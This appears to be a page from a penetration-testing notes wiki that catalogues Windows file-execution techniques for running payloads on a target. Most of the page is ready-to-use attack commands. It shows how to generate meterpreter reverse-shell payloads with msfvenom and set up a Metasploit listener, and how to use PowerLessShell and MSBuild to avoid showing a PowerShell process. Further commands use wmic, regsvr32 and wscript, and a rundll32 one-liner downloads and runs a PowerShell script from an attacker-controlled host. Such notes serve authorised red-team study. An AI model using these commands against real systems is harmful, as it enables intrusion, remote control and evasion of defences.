# File Execution Methods

### Explorer

```bash
explorer.exe /root,"C:\Windows\System32\calc.exe"
explorer.exe /root,"C:\Windows\Temp\Shell.exe"
```

### PowerLessShell

PowerLessShell is a Python-based tool that generates malicious code to run on a target machine without showing an instance of the `PowerShell` process. PowerLessShell relies on abusing the Microsoft Build Engine (MSBuild), a platform for building Windows applications, to execute remote code.

**GitHub:** [https://github.com/Mr-Un1k0d3r/PowerLessShell](https://github.com/Mr-Un1k0d3r/PowerLessShell)

After cloning the repository, generate a `msfvenom` payload as per the syntax shown below.

```
msfvenom -p windows/meterpreter/reverse_winhttps LHOST=<IP> LPORT=445 -f psh-reflection > shell.ps1
```

Set a `Metasploit` listener

```
msfconsole -q -x "use exploit/multi/handler; set payload windows/meterpreter/reverse_winhttps; set lhost <IP>;set lport 445;exploit"
```

From the PowerLessShell repository build the project file.

```bash
python2 PowerLessShell.py -type powershell -source ~/opt/shell.ps1  -output ~/opt/shell.csproj
```

![](<../../.gitbook/assets/image (516).png>)

After building completes, transfer the `.csproj` file to the target system. Then use the command below to execute. (Framework versions will vary).

```
c:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe c:\windows\temp\shell.csproj
```

Wait a short while...

![](<../../.gitbook/assets/image (1971).png>)

Where we should land a shell.

![](<../../.gitbook/assets/image (192).png>)

Checking the running processes on the target system whilst the shell is active shows no PowerShell.exe processes' running.

![](<../../.gitbook/assets/image (54).png>)

### Wmic

```bash
# Execute binary on local system
wmic.exe process call create c\windows\temp\Shell.exe

# Execute binary on remote system
wmic.exe /node:"10.10.10.10" process call create "Shell.exe"
```

### Rundll32

```powershell
# Execute JavaScript script that runs a PowerShell script from a remote server
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();new%20ActiveXObject("WScript.Shell").Run("powershell -nop -exec bypass -c IEX (New-Object Net.WebClient).DownloadString('http://<IP>/<File.ps1>');"

# Execute a JavaScript script that runs calc.exe.
rundll32.exe javascript:"\..\mshtml.dll,RunHTMLApplication ";eval("w=new%20ActiveXObject(\"WScript.Shell\");w.run(\"calc\");window.close()");

# Execute a DLL on a SMB share. EntryPoint is the name of the entry point in the .DLL file to execute.
rundll32.exe \\10.10.10.10\share\payload.dll,EntryPoint
```

### Regsvr32

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> LPORT=445 -f dll -a x86 > Shell.dll 
```

Upload to target system and execute.

```
regsvr32.exe c:\windows\temp\shell.dll
```

### WScript

Wscript can be used to run vbs file's which can be executed within text files to bypass file extension blacklisting.

```
c:\Windows\System32>wscript /e:VBScript c:\Users\moe\Desktop\shell.txt
```

### Shortcuts

\<WIP>
